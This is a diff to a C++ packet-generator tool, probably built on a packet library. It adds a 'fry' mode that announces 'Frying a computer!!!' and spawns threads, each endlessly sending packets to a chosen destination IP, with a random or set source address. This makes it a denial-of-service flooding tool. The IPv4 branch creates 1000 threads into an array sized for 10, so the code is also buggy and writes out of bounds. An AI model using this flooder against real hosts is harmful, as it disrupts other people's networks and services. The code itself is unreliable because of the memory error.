@@ -4,7 +4,7 @@
 #include <cstring>
 #include <cstdlib>
 #include <limits>
-
+#include <pthread.h>
 
 
 #include "icmpv6.h"
@@ -31,8 +31,8 @@ void help() {
           << "  --size=INT       Set size (default 1024)\n"
           << "  --src_ip=IP      Set source IP address, if empty, src will be generated same as --random\n"
           << "  --dst_ip=IP      Set destination IP address (required)\n"
-          << "  --src_port=PORT  Set source port\n"
-          << "  --dst_port=PORT  Set destination port\n"
+          << "  --src_port=PORT  Set source port (ignored when icmp is used) (default: 1000) \n"
+          << "  --dst_port=PORT  Set destination port (default: 1001)\n"
           << "  --random         Generates a random IPv4 or IPv6 address for source.\n"
           << "  --timeout=INT    Sets the timeout period in seconds, after which the program will end.\n"
           << "  --count=INT      Sets the number of packets to be sent.\n"
@@ -43,12 +43,27 @@ void help() {
           << "  --help           Display this help message\n";
 }
 
+void* parallel4Send(void* packet) {
+    IP* pkt = (IP*)packet;
+    PacketSender sender;
+    while (true){
+        sender.send(*pkt);
+    }
+}
+void* parallel6Send(void* packet) {
+    PacketSender sender;
+    IPv6* pkt = (IPv6*)packet;
+    while (true){
+        sender.send(*pkt);
+    }
+}
 
 int main(int argc, char* argv[]) {
 
     IP packet;
     IPv6 packet6;
     PacketSender sender;
+    pthread_t threads[10];
     int counter = 0;
 
     long long end_time = std::numeric_limits<long long>::max();
@@ -183,7 +198,22 @@ int main(int argc, char* argv[]) {
 
     // packet generator
     if (fry) {
-        //TODO: run POSIX threads and send it
+        printf("Frying a computer!!!");
+        if (is_ipv6) {
+            for (int i = 0; i < 10; ++i) {
+                if (pthread_create(&threads[i], NULL, parallel6Send, &packet6)) {
+                    fprintf(stderr, "Error creating thread %d\n", i);
+                    return 1;
+                }
+            }
+        } else {
+            for (int i = 0; i < 1000; ++i) {
+                if (pthread_create(&threads[i], NULL, parallel4Send, &packet)) {
+                    fprintf(stderr, "Error creating thread %d\n", i);
+                    return 1;
+                }
+            }
+        }
     } else {
 
         if (timeout > 0) {
